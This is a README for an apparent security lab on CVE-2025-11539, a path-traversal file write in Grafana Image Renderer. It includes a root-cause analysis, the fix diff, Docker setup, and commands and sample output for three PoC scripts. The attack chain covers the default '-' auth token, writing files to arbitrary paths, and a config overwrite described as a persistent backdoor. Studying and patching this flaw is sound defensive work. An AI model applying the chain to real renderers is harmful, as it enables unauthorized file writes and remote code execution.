# CVE-2025-11539 - Grafana Image Renderer Arbitrary File Write / RCE

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-11539 |
| Component | [Grafana Image Renderer](https://github.com/grafana/grafana-image-renderer) |
| Type | CWE-94: Improper Control of Generation of Code (Code Injection) |
| CVSS | 9.9 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| EPSS | 0.5% (65.7th percentile) |
| Affected | 1.0.0 through 4.0.16 |
| Fix | Upgrade to v4.0.17 ([PR #801](https://github.com/grafana/grafana-image-renderer/pull/801)) |
| Author | Exploit Intelligence Platform |
| Date | 2025-10-09 |

## Vulnerability Details

The Grafana Image Renderer plugin (versions 1.0.0 through 4.0.16) is vulnerable to **arbitrary file write via path traversal** in the `filePath` query parameter of the `/render` and `/render/csv` HTTP endpoints. An authenticated attacker can write attacker-controlled content to any writable path on the renderer's filesystem, leading to remote code execution.

In `src/service/http-server.ts`, both handlers assign `req.query.filePath` to the render options object without checks:

```typescript
// /render handler
const options: ImageRenderOptions = {
  url: req.query.url,
  filePath: req.query.filePath,  // USER-CONTROLLED — NO VALIDATION
};

// /render/csv handler
const options: RenderOptions = {
  url: req.query.url,
  filePath: req.query.filePath,  // USER-CONTROLLED — NO VALIDATION
};
```

In `src/browser/browser.ts`, the tainted `filePath` reaches two file I/O sinks:

1. **`takeScreenshot()`** — passes `options.filePath` to `page.screenshot({ path: options.filePath })`, writing a PNG/PDF to an attacker-chosen path.
2. **`exportCSV()`** — calls `fs.copyFileSync(downloadFilePath, options.filePath)`, copying attacker-controlled download content to an attacker-chosen path. This gives the attacker **full control over both the file content and the destination**.

Authentication is required but trivially bypassed: the default token is `-` (a single hyphen), configured in `default.json` and validated via the `X-Auth-Token` HTTP header.

### Attack Chain

```
1. Attacker identifies Grafana Image Renderer on port 8081 (default)
2. Authenticate with default token: X-Auth-Token: -
3. Send GET /render with filePath=/arbitrary/path (screenshot write)
   — OR —
   Send GET /render/csv with url=attacker-server, filePath=/arbitrary/path
   (full content control via Chromium download)
4. File written to attacker-controlled path on renderer filesystem
5. Escalate to RCE via malicious .so injection, config overwrite, or code overwrite
```

### Fix

The fix was introduced in commit [`1858c2c`](https://github.com/grafana/grafana-image-renderer/commit/1858c2c51347b23f43b1d288bc9222f16030e3f9) (PR [#801](https://github.com/grafana/grafana-image-renderer/pull/801)), released in **v4.0.17**.

It adds an `assertNoPathTraversal()` validation function called at the entry of both `takeScreenshot()` and `exportCSV()`:

```diff
+ function assertNoPathTraversal(path?: string | null) {
+   if (!path) {
+     return;
+   }
+   if (path.indexOf('/') !== -1 || path.indexOf('\\') !== -1 || path === '..') {
+     throw boom.badRequest('File path should not include directories');
+   }
+ }
```

The patched version rejects any `filePath` containing `/` or `\` characters, returning HTTP 400 before any file I/O occurs. No bypass vectors were identified.

## Lab Setup

### Architecture

```
┌──────────────────┐        ┌──────────────────────────────────┐
│   PoC Script     │──8081──▶  cve-2025-11539-renderer         │
│   (attacker)     │        │  (Grafana Image Renderer v4.0.16)│
└──────────────────┘        │          │                        │
                            │          │ 3000                   │
                            │          ▼                        │
                            │  cve-2025-11539-grafana           │
                            │  (Grafana 11.6.0)                │
                            └──────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-11539

# Build and start
docker compose build
docker compose up -d

# Run the exploit (vector 1 — simplest)
python3 poc/poc.py <renderer_ip>

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-11539-grafana` | Dashboard | `grafana/grafana:11.6.0` | `3000` | Provides URLs for the renderer to navigate to |
| `cve-2025-11539-renderer` | Target | `node:22-bookworm` + Chromium | `8081` | Vulnerable Grafana Image Renderer v4.0.16 |

### Default Credentials

| Service | Auth Mechanism | Default Value |
|---|---|---|
| Renderer API | `X-Auth-Token` header | `-` (single hyphen) |
| Grafana | Anonymous access | Enabled (no login required) |

## PoC Usage

Three PoC scripts are provided, each demonstrating a different attack vector. All scripts use Python 3 stdlib only (no external dependencies) and auto-detect the renderer container IP.

### Vector 1: Arbitrary File Write via `/render` (Simplest)

Writes a PNG screenshot to an attacker-controlled path. Single HTTP request, trivial complexity.

```bash
python3 poc/poc.py <renderer_ip>
```

#### Expected Output (Vulnerable)

```
======================================================================
  CVE-2025-11539 PoC — Arbitrary File Write via /render
======================================================================

[*] Step 1: Starting file watcher inside container...
[*] Step 2: Sending exploit request to /render endpoint...
[+] Response: HTTP 200, Content-Type: image/png, Body size: 3625 bytes

[*] Step 3: Waiting for file watcher to detect the written file...

[+] ═══════════════════════════════════════════════════════════
[+]  VULNERABILITY CONFIRMED — Arbitrary File Write Succeeded!
[+] ═══════════════════════════════════════════════════════════

    -rw-r--r-- 1 root root 3625 ... /tmp/cve-2025-11539-poc-XXXXXXXX.png
    /tmp/cve-2025-11539-poc-XXXXXXXX.png: PNG image data, 100 x 100, 8-bit/color RGB

[+] The renderer wrote a PNG screenshot to /tmp/cve-2025-11539-poc-XXXXXXXX.png
[+] No path validation was performed — ANY writable path is reachable
```

### Vector 2: Full Content Control via `/render/csv` (RCE Primitive)

Writes attacker-controlled binary content to an arbitrary path by hosting a malicious download server. Proves full content control with an exact canary string match.

```bash
python3 poc/poc_vector2.py <renderer_ip>
```

#### Expected Output (Vulnerable)

```
[+] ═══════════════════════════════════════════════════════════════
[+]  FULL CONTENT CONTROL CONFIRMED!
[+]  Attacker-controlled content written to arbitrary path
[+] ═══════════════════════════════════════════════════════════════

[+] Expected canary: CVE-2025-11539-FULL-CONTENT-CONTROL-PROOF-XXXXXXXX
[+] File content:    CVE-2025-11539-FULL-CONTENT-CONTROL-PROOF-XXXXXXXX
[+] Content match:   ✓ EXACT MATCH
```

### Vector 3: Config Overwrite — Persistent Backdoor

Overwrites the renderer's `config.json` via absolute path (`/app/config.json`) to replace the auth token with an attacker-controlled value.

```bash
python3 poc/poc_vector3.py <renderer_ip>
```

#### Expected Output (Vulnerable)

```
[+] ═══════════════════════════════════════════════════════════════
[+]  CONFIG OVERWRITE CONFIRMED!
[+]  Application auth token replaced with attacker-controlled value
[+] ═══════════════════════════════════════════════════════════════

    Original token:  -
    New token:       ATTACKER-CONTROLLED-TOKEN-CVE-2025-11539
```

> **Note:** Vector 3 automatically restores the original `config.json` after verification.

## Verification: Vulnerable vs Patched

| Test | Vulnerable (v4.0.16) | Patched (v4.0.17+) |
|---|---|---|
| **`/render` with traversal filePath** | HTTP 200 — file written to arbitrary path | HTTP 400 — `File path should not include directories` |
| **`/render/csv` with traversal filePath** | HTTP 200 — attacker content at arbitrary path | HTTP 400 — rejected before file I/O |
| **Absolute path `/app/config.json`** | Config overwritten with attacker payload | HTTP 400 — `/` rejected |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Vector 1: Arbitrary file write via `/render` endpoint (screenshot) |
| `poc/poc_vector2.py` | Vector 2: Full content control via `/render/csv` (RCE primitive) |
| `poc/poc_vector3.py` | Vector 3: Config overwrite via `/render/csv` (persistent backdoor) |
| `Dockerfile.vulnerable` | Builds Grafana Image Renderer v4.0.16 from source |
| `docker-compose.yml` | Two-container lab: Grafana + vulnerable renderer |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab construction documentation |
| `poc_verification_report.md` | Test results across all three vectors |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-11539)
- [Grafana Security Advisory](https://grafana.com/security/security-advisories/cve-2025-11539/)
- [Fix PR #801](https://github.com/grafana/grafana-image-renderer/pull/801)
- [Fix Commit](https://github.com/grafana/grafana-image-renderer/commit/1858c2c51347b23f43b1d288bc9222f16030e3f9)
- [Patched Release (v4.0.17)](https://github.com/grafana/grafana-image-renderer/releases/tag/v4.0.17)
- [Source Repository](https://github.com/grafana/grafana-image-renderer)

## Timeline

| Date | Event |
|---|---|
| 2025-10-09 | CVE-2025-11539 published |
| 2025-10-09 | Grafana security advisory released |
| 2025-10-09 | Fix released in v4.0.17 (PR #801, commit `1858c2c`) |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-11539 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
